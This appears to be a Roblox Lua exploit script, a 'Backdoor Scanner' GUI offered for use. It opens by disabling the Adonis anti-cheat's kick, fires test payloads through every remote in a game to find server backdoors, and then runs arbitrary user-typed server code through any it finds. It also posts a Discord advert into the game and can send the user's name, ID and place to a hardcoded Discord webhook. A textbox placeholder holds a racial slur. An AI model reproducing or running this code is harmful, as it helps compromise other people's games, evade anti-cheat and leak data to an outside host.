-- // Bypass Adonis

for k,v in pairs(game:GetDescendants()) do if pcall(function() return rawget(v,"indexInstance") end) and type(rawget(v,"indexInstance")) == "table" and (rawget(v,"indexInstance"))[1] == "kick" then v.tvk = {"kick",function() return false end} end end

task.wait(.5)
-- // GUI TO LUA \\ --

-- // INSTANCES: 16 | SCRIPTS: 2 | MODULES: 2 \\ --

local UI = {}

-- // StarterGui.ScreenGui \\ --
UI["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"))
UI["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
UI["1"]["ResetOnSpawn"] = false




-- // StarterGui.ScreenGui.CanvasGroup \\ --
UI["2"] = Instance.new("CanvasGroup", UI["1"])
UI["2"]["BorderSizePixel"] = 0
UI["2"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46)
UI["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5)
UI["2"]["Size"] = UDim2.new(0, 417, 0, 349)
UI["2"]["Position"] = UDim2.new(0.50493, 0, 0.56203, 0)
UI["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)

-- // StarterGui.ScreenGui.CanvasGroup.title \\ --
UI["3"] = Instance.new("TextLabel", UI["2"])
UI["3"]["BorderSizePixel"] = 0
UI["3"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36)
UI["3"]["TextSize"] = 14
UI["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["3"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["3"]["Size"] = UDim2.new(0, 417, 0, 24)
UI["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["3"]["Text"] = [[Sunnd4y Backdoor Scanner]]
UI["3"]["Name"] = [[title]]

-- // StarterGui.ScreenGui.CanvasGroup.TextBox \\ --
UI["4"] = Instance.new("TextBox", UI["2"])
UI["4"]["CursorPosition"] = -1
UI["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["4"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255)
UI["4"]["TextXAlignment"] = Enum.TextXAlignment.Left
UI["4"]["TextSize"] = 14
UI["4"]["TextYAlignment"] = Enum.TextYAlignment.Top
UI["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["4"]["MultiLine"] = true
UI["4"]["ClearTextOnFocus"] = false
UI["4"]["PlaceholderText"] = [[require(123456)("Blackassnigga")]]
UI["4"]["Size"] = UDim2.new(0, 302, 0, 251)
UI["4"]["Position"] = UDim2.new(0.0675, 0, 0.1404, 0)
UI["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["4"]["Text"] = [[]]
UI["4"]["TextWrapped"] = true
UI["4"]["BackgroundTransparency"] = 1

-- // StarterGui.ScreenGui.CanvasGroup.status \\ --
UI["5"] = Instance.new("TextLabel", UI["2"])
UI["5"]["BorderSizePixel"] = 0
UI["5"]["TextXAlignment"] = Enum.TextXAlignment.Left
UI["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["5"]["TextSize"] = 14
UI["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["5"]["TextColor3"] = Color3.fromRGB(255, 0, 0)
UI["5"]["BackgroundTransparency"] = 1
UI["5"]["Size"] = UDim2.new(0, 200, 0, 22)
UI["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["5"]["Text"] = [[Status : Not Inject]]
UI["5"]["Name"] = [[status]]
UI["5"]["Position"] = UDim2.new(0.0675, 0, 0.89971, 0)

-- // StarterGui.ScreenGui.CanvasGroup.execute \\ --
UI["6"] = Instance.new("TextButton", UI["2"])
UI["6"]["BorderSizePixel"] = 0
UI["6"]["TextSize"] = 14
UI["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["6"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36)
UI["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["6"]["Size"] = UDim2.new(0, 69, 0, 55)
UI["6"]["BackgroundTransparency"] = 1
UI["6"]["Name"] = [[execute]]
UI["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["6"]["Text"] = [[EXE]]
UI["6"]["Position"] = UDim2.new(0.7925, 0, 0.1404, 0)

-- // StarterGui.ScreenGui.CanvasGroup.clear \\ --
UI["7"] = Instance.new("TextButton", UI["2"])
UI["7"]["TextSize"] = 14
UI["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["7"]["Size"] = UDim2.new(0, 69, 0, 55)
UI["7"]["BackgroundTransparency"] = 1
UI["7"]["Name"] = [[clear]]
UI["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["7"]["Text"] = [[CLR]]
UI["7"]["Position"] = UDim2.new(0.7925, 0, 0.4212, 0)

-- // StarterGui.ScreenGui.CanvasGroup.inject \\ --
UI["8"] = Instance.new("TextButton", UI["2"])
UI["8"]["TextSize"] = 14
UI["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["8"]["Size"] = UDim2.new(0, 69, 0, 55)
UI["8"]["BackgroundTransparency"] = 1
UI["8"]["Name"] = [[inject]]
UI["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["8"]["Text"] = [[INJ]]
UI["8"]["Position"] = UDim2.new(0.7925, 0, 0.70201, 0)

-- // StarterGui.ScreenGui.CanvasGroup.draggy \\ --
UI["9"] = Instance.new("LocalScript", UI["2"])
UI["9"]["Name"] = [[draggy]]

-- // StarterGui.ScreenGui.CanvasGroup.BackDoorScanner \\ --
UI["a"] = Instance.new("ModuleScript", UI["2"])
UI["a"]["Name"] = [[BackDoorScanner]]

-- // StarterGui.ScreenGui.CanvasGroup.BackDoorScanner.LocalScript \\ --
UI["b"] = Instance.new("LocalScript", UI["a"])


-- // StarterGui.ScreenGui.CanvasGroup.BackDoorScanner.button_callback \\ --
UI["c"] = Instance.new("ModuleScript", UI["a"])
UI["c"]["Name"] = [[button_callback]]

-- // StarterGui.ScreenGui.CanvasGroup.reset \\ --
UI["d"] = Instance.new("TextButton", UI["2"])
UI["d"]["TextSize"] = 14
UI["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["d"]["Size"] = UDim2.new(0, 53, 0, 49)
UI["d"]["BackgroundTransparency"] = 1
UI["d"]["Name"] = [[reset]]
UI["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["d"]["Text"] = [[RE]]
UI["d"]["Position"] = UDim2.new(0.6654, 0, 0.8596, 0)

-- // StarterGui.ScreenGui.CanvasGroup.r6 \\ --
UI["e"] = Instance.new("TextButton", UI["2"])
UI["e"]["TextSize"] = 14
UI["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["e"]["Size"] = UDim2.new(0, 53, 0, 49)
UI["e"]["BackgroundTransparency"] = 1
UI["e"]["Name"] = [[r6]]
UI["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["e"]["Text"] = [[R6]]
UI["e"]["Position"] = UDim2.new(0.5455, 0, 0.8596, 0)

-- // StarterGui.ScreenGui.CanvasGroup.censor \\ --
UI["f"] = Instance.new("ImageLabel", UI["2"])
UI["f"]["BorderSizePixel"] = 0
UI["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["f"]["Image"] = [[http://www.roblox.com/asset/?id=15288762652]]
UI["f"]["Size"] = UDim2.new(0, 302, 0, 251)
UI["f"]["Visible"] = false
UI["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["f"]["Name"] = [[censor]]
UI["f"]["Position"] = UDim2.new(0.06715, 0, 0.1404, 0)

-- // StarterGui.ScreenGui.CanvasGroup.hide \\ --
UI["10"] = Instance.new("ImageButton", UI["2"])
UI["10"]["BorderSizePixel"] = 0
UI["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["10"]["Image"] = [[rbxassetid://13321848320]]
UI["10"]["Size"] = UDim2.new(0, 25, 0, 25)
UI["10"]["BackgroundTransparency"] = 1
UI["10"]["Name"] = [[hide]]
UI["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["10"]["Position"] = UDim2.new(0.90887, 0, 0, 0)

-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
    local ModuleState = G2L_MODULES[Module];
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true;
            ModuleState.Value = ModuleState.Closure();
        end
        return ModuleState.Value;
    end;
    return G2L_REQUIRE(Module);
end

G2L_MODULES[UI["a"]] = {
Closure = function()
    local script = UI["a"]
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService('ReplicatedStorage')

export type RemoteDictionary = { [string]: RemoteFunction | RemoteEvent }

local BackdoorScanner = {}
BackdoorScanner.__index = BackdoorScanner

local BackdoorScannerMeta = {
    __index = BackdoorScanner,
    __newindex = function(t, k, v)
        rawset(t, k, v)
    end
}

function BackdoorScanner:RunRemote(remote: RemoteFunction | RemoteEvent, payload: string)
    if remote:IsA("RemoteEvent") then
        pcall(remote.FireServer, remote, payload)
    elseif remote:IsA("RemoteFunction") then
        task.spawn(function()
            pcall(remote.InvokeServer, remote, payload)
        end)
    end
end

function BackdoorScanner:FindRemote(statusLabel: TextLabel): RemoteDictionary
    local startTime = tick()
    local remotes: RemoteDictionary = {}

    local excludedPatterns = {
        ['RobloxReplicatedStorage'] = true,
        ['__FUNCTION'] = true,
        ['HDAdminClient'] = true,
        ['DefaultChatSystemChatEvents'] = true
    }

    local function isExcluded(name: string): boolean
        for pattern in pairs(excludedPatterns) do
            if name:find(pattern) then
                return true
            end
        end
        return false
    end

    for _, remote in ipairs(game:GetDescendants()) do
        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
            local fullName = remote:GetFullName()
            if not isExcluded(fullName) then
                local code = "TempCode" .. tick()
                self:RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
                remotes[code] = remote
            end
        end
    end

    local function checkRemote(remote: RemoteFunction | RemoteEvent, code: string): boolean
        if workspace:FindFirstChild(code) then
            local elapsed = tick() - startTime
            print("Backdoor found in " .. elapsed .. " seconds!")
            statusLabel.Text = "Status : Inject"
            statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)

            self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Hexon SS join now! : https://discord.gg/sc4zKCmhGP ' a.Parent=workspace wait(10) a:Destroy()")

            local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
            if request and _G.Hexon_Log then
                pcall(function()
                    request({
                        Url = 'https://discord.com/api/webhooks/1274230884064694282/8Cy9F1lloRs7dfVksKMkLdgzE24eEKKzx_-aTDiGZxebGeZX0FpL4NPrPe4okmU7VnCY',
                        Method = 'POST',
                        Headers = { ['Content-Type'] = 'application/json' },
                        Body = HttpService:JSONEncode({
                            username = 'Backdoor Scanner',
                            content = "**User: `" .. game:GetService('Players').LocalPlayer.Name .. "` | `" .. game:GetService('Players').LocalPlayer.UserId .. "`\nhttps://www.roblox.com/games/" .. game.PlaceId .. "\n`" .. remote:GetFullName() .. "`**",
                        })
                    })
                end)
            end
            return true
        end
        return false
    end
    
    
    
    local batch_size = 100
    local amount = 0

    while  amount < batch_size do
        amount += 1
        for code, remote in next, remotes do
            if checkRemote(remote, code) then
                return remotes
            end
        end
        RunService.Stepped:Wait()
    end

    statusLabel.Text = "Status : Inject Failed, no Backdoors found"
    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    return remotes
end

setmetatable(BackdoorScanner, BackdoorScannerMeta)

return BackdoorScanner


end
}
G2L_MODULES[UI["c"]] = {
Closure = function()
    local script = UI["c"]
local btn_callback = {}

btn_callback.__index= btn_callback


btn_callback.OnceUpOnly = function(btn : TextButton | ImageButton, info)
    local callback = info.Callback or function() end
    
    btn.MouseButton1Click:Once(function()
        pcall(callback)
    end)
end

btn_callback.ConnectEveryClick = function(btn : TextButton | ImageButton, info)
    local callback = info.Callback or function() end

    btn.MouseButton1Click:Connect(function()
        pcall(callback)
    end)
end


return btn_callback
end
}
-- // StarterGui.ScreenGui.CanvasGroup.draggy \\ --
local function SCRIPT_9()
local script = UI["9"]
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
	    local delta = input.Position - dragStart
	    gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.04, true) -- This is what I changed
	end
	
	gui.InputBegan:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	        dragging = true
	        dragStart = input.Position
	        startPos = gui.Position
	
	        input.Changed:Connect(function()
	            if input.UserInputState == Enum.UserInputState.End then
	                dragging = false
	            end
	        end)
	    end
	end)
	
	gui.InputChanged:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	        dragInput = input
	    end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
	    if input == dragInput and dragging then
	        update(input)
	    end
	end)
end
task.spawn(SCRIPT_9)
-- // StarterGui.ScreenGui.CanvasGroup.BackDoorScanner.LocalScript \\ --
local function SCRIPT_b()
local script = UI["b"]
	local BackdoorScanner = require(script.Parent)
	local button_manager = require(script.Parent.button_callback)
	
	local canvagroup = script.Parent.Parent
	local statusLabel = canvagroup.status
	local injectbtn = canvagroup.inject
	local executebtn = canvagroup.execute
	local clearbtn = canvagroup.clear
	local txtbox = canvagroup.TextBox
	local rsix = canvagroup.r6
	local re = canvagroup.reset
	local hide = canvagroup.hide
	local censor = canvagroup.censor
	
	
	local remotes = {}
	
	
	local function Execute(remotes: RemoteDictionary, code: string)
	    if next(remotes) then
	        for _, remote in next, remotes do
	            BackdoorScanner:RunRemote(remote, code)
	        end
	    else
	        warn("Please inject before execute.")
	    end
	end
	
	button_manager.OnceUpOnly(injectbtn, {
	    Callback = function()
	        remotes = BackdoorScanner:FindRemote(statusLabel)
	    end,
	})
	
	button_manager.ConnectEveryClick(executebtn, {
	    Callback = function()
	        local code = txtbox.Text:gsub("LocalPlayer", tostring(game.Players.LocalPlayer))
	        if code and code ~= "" then
	            Execute(remotes, code)
	        else
	            warn("Please enter a valid code.")
	        end
	    end,
	})
	
	button_manager.ConnectEveryClick(clearbtn, {
	    Callback = function()
	        txtbox.Text = ""
	    end,
	})
	
	
	
	button_manager.ConnectEveryClick(re, {
	    Callback = function()
	        Execute(remotes, [[game.Players.]]..tostring(game.Players.LocalPlayer)..[[:LoadCharacter()]])
	    end,
	})
	
	button_manager.ConnectEveryClick(rsix, {
	    Callback = function()
	        
	        
	        local r6_code = [[
	        local plr = game.Players.]]..tostring(game.Players.LocalPlayer)..[[
				if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
					local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
					local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R6)
					morph:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame)
					morph.Name = plr.Name
					plr.Character = morph
					morph.Parent = workspace	
				end
	          ]]
	        
	        Execute(remotes, r6_code)
	    end,
	})
	
	
	button_manager.ConnectEveryClick(hide, {
	    Callback = function()
	        censor.Visible = not censor.Visible
	    end,
	})
end
task.spawn(SCRIPT_b)

return UI["1"]
